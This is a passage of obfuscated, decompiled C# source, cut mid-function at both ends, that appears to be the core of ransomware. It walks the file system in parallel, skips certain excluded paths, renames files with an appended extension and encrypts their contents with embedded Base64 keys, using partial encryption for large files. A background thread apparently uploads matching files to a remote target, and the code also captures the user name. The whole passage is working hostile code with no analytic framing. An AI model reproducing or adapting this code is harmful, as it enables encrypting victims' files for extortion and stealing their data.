											fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386214), Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
										}
									}
									else
									{
										try
										{
											if (!PAOJgADrbjEa)
											{
												TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
											}
											else
											{
												TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
											}
										}
										catch (Exception ex14)
										{
											if (CCDyMIHlAe)
											{
												try
												{
													File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386237) + ex14.Message + mDsrdwsfBAgqx.getString_0(107395729));
												}
												catch (Exception)
												{
												}
											}
											LVKhJcfUHGhpJNXz++;
											goto end_IL_08b2;
										}
									}
									if (PAOJgADrbjEa)
									{
										if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
										{
											XZXEHUgcqrufd(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bytes2);
										}
										else
										{
											XZXEHUgcqrufd(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, bytes2);
										}
									}
									goto IL_10b9;
								}
								CS_0024_003C_003E8__locals0 = new mDsrdwsfBAgqx.EaaSLAhSrkAd();
								CS_0024_003C_003E8__locals0.SnSgbcozGOnPa = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.irnVJvnuIedJmu = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
									{
										if (YazilaoopZ)
										{
											CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
										}
										File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ);
									}
								}
								catch (Exception ex14)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402766) + ex14.Message + mDsrdwsfBAgqx.getString_0(107395729));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									goto end_IL_08b2;
								}
								CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = mDsrdwsfBAgqx.getString_0(107389259);
								if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
								{
									CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
								}
								else
								{
									CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = CS_0024_003C_003E8__locals1.ldrdWbhdALtRA;
								}
								if (DXDIUZMazYGZy == mDsrdwsfBAgqx.getString_0(107396809))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in YoPwmbBPpdD)
										{
											if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.irnVJvnuIedJmu.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107396816))
											{
												if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL).Length)
												{
													try
													{
														yWTIBbUKdpiy.ybntlhJHhisLb(mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107389891), mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107389886), mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107389841), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item) && HFFrRFIpQgjXI == mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107396640))
											{
												try
												{
													yWTIBbUKdpiy.ybntlhJHhisLb(mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107389891), mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107389886), mDsrdwsfBAgqx.EaaSLAhSrkAd.getString_0(107389841), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
								if (nqNdPWHffReq == mDsrdwsfBAgqx.getString_0(107396633))
								{
									byte[] array2 = null;
									byte[] byte_2 = NQdDIFAnEzVM.KQanXSigbuDh(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
									if (NQdDIFAnEzVM.EHTmbBVFpgxa(AaZhmxjLrXnGZ: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? NQdDIFAnEzVM.SvtZMRYDytMixf(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NQdDIFAnEzVM.SvtZMRYDytMixf(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? sAdFSOOagDt.tbzmVxgbIeuZ(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : sAdFSOOagDt.tbzmVxgbIeuZ(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), zTKGzNBbRH: CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, KJxeENlSQsJIpV: bytes2))
									{
										goto IL_10b9;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
									}
									catch (Exception)
									{
									}
								}
								else if (!PAOJgADrbjEa)
								{
									if (GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
									{
										goto IL_10b9;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, bytes2, Convert.FromBase64String(sTQyJSLcZOIiC)))
									{
										goto IL_10b9;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08b2:;
							}
							catch (Exception)
							{
								goto IL_10b9;
							}
						}
					}
					continue;
					IL_10b9:
					CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG.Remove(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new mDsrdwsfBAgqx.SmDDBVlBSoLlZfP();
			CS_0024_003C_003E8__locals0.irnVJvnuIedJmu = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ldrdWbhdALtRA = string_0;
			if (((!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107389347)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388778)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388745)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388760)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388715)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388690)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388701)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388656)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388675)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388638)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388629)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388612)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388554)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388565))) || CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107389052)))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388979)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388994)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388945)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388960)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388911)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388926)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388877)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388892)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388847)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388858)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388813)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388832)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388271)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388286)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107388237))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388212)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107396229)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388199)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388174)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388169)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388196)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388191)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388186)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(dtHHyJMWMTcTg) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
			{
				if (CS_0024_003C_003E8__locals0.nBTsxqqCcIrA.Length != 0)
				{
					string[] nBTsxqqCcIrA = CS_0024_003C_003E8__locals0.nBTsxqqCcIrA;
					int num = 0;
					while (num < nBTsxqqCcIrA.Length)
					{
						string value = nBTsxqqCcIrA[num];
						if (!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1036;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ))
					{
						goto IL_1036;
					}
				}
				catch (Exception)
				{
					goto IL_1036;
				}
				if (!SNtBTLidlROtoV.Contains(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
				{
					if (BBqvZtJMKtZyzF == mDsrdwsfBAgqx.getString_0(107396809))
					{
						try
						{
							if (uruahRFIszrntX.bURwEzWcMZKaoi(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
							{
								uruahRFIszrntX.BBxxokkeNIlNHfR(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
							}
						}
						catch
						{
						}
					}
					SNtBTLidlROtoV.Add(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (fgLeGcGjPkpRXH)
							{
								Console.WriteLine(mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107402711) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107402608) + new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length + mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107402587));
								Console.WriteLine(mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107402686), SNtBTLidlROtoV.Count, qXIAEocyZgLqByS, LVKhJcfUHGhpJNXz);
								Console.WriteLine(mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107402661), lBGXxmsJjqv.Elapsed);
								Console.WriteLine(mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107402578));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA)))
					{
						HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA));
					}
					kstUyDfByMqYOzIx(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					try
					{
						new SnjLOUpfRioti().fwTUnyzIwakYqxR(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (fgLeGcGjPkpRXH)
								{
									Console.WriteLine(mDsrdwsfBAgqx.getString_0(107403155) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402598) + new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length + mDsrdwsfBAgqx.getString_0(107402577));
									Console.WriteLine(mDsrdwsfBAgqx.getString_0(107402568));
								}
							}
							catch
							{
							}
							xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107402495)), mDsrdwsfBAgqx.getString_0(107388070) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107388070) + PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107402438)) + mDsrdwsfBAgqx.getString_0(107388070) + Environment.UserName + mDsrdwsfBAgqx.getString_0(107388070) + PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107402453)));
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402428) + ex2.Message + mDsrdwsfBAgqx.getString_0(107395729));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length != 0L)
							{
								goto end_IL_0880;
							}
							goto end_IL_087f;
							end_IL_0880:;
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402827) + ex2.Message + mDsrdwsfBAgqx.getString_0(107395729));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_087f;
						}
						if (QOKbVStgyeVL == mDsrdwsfBAgqx.getString_0(107396809) && new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
								{
									if (YazilaoopZ)
									{
										CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
									}
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ);
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402766) + ex2.Message + mDsrdwsfBAgqx.getString_0(107395729));
									}
									catch (Exception)
									{
									}
								}
								LVKhJcfUHGhpJNXz++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
							{
								CS_0024_003C_003E8__locals0.ldrdWbhdALtRA += CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
							}
							if (DXDIUZMazYGZy == mDsrdwsfBAgqx.getString_0(107396809))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in YoPwmbBPpdD)
									{
										if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.irnVJvnuIedJmu.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107396819))
										{
											if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length)
											{
												try
												{
													yWTIBbUKdpiy.ybntlhJHhisLb(mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107389894), mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107389889), mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107389844), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107396643))
										{
											try
											{
												yWTIBbUKdpiy.ybntlhJHhisLb(mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107389894), mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107389889), mDsrdwsfBAgqx.SmDDBVlBSoLlZfP.getString_0(107389844), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (nqNdPWHffReq == mDsrdwsfBAgqx.getString_0(107396633))
							{
								byte[] array = null;
								byte[] byte_ = NQdDIFAnEzVM.KQanXSigbuDh(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
								if (!NQdDIFAnEzVM.EHTmbBVFpgxa(AaZhmxjLrXnGZ: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), zTKGzNBbRH: CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, KJxeENlSQsJIpV: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!PAOJgADrbjEa)
							{
								if (!GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, bytes, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (YazilaoopZ)
							{
								CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
							{
								if (!UOlZmEwYRBbnfmvt)
								{
									if (!PAOJgADrbjEa)
									{
										fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
									}
									else
									{
										fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
									}
								}
								else
								{
									try
									{
										if (!PAOJgADrbjEa)
										{
											TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
										}
										else
										{
											TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
										}
									}
									catch (Exception ex2)
									{
										if (CCDyMIHlAe)
										{
											try
											{
												File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386237) + ex2.Message + mDsrdwsfBAgqx.getString_0(107395729));
											}
											catch (Exception)
											{
											}
										}
										LVKhJcfUHGhpJNXz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!UOlZmEwYRBbnfmvt)
							{
								if (!PAOJgADrbjEa)
								{
									fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386214), bGfpmpYMCsNkyjcK);
								}
								else
								{
									fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386214), Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
								}
							}
							else
							{
								try
								{
									if (!PAOJgADrbjEa)
									{
										TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
									}
									else
									{
										TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
									}
								}
								catch (Exception ex2)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386237) + ex2.Message + mDsrdwsfBAgqx.getString_0(107395729));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									return;
								}
							}
							if (PAOJgADrbjEa)
							{
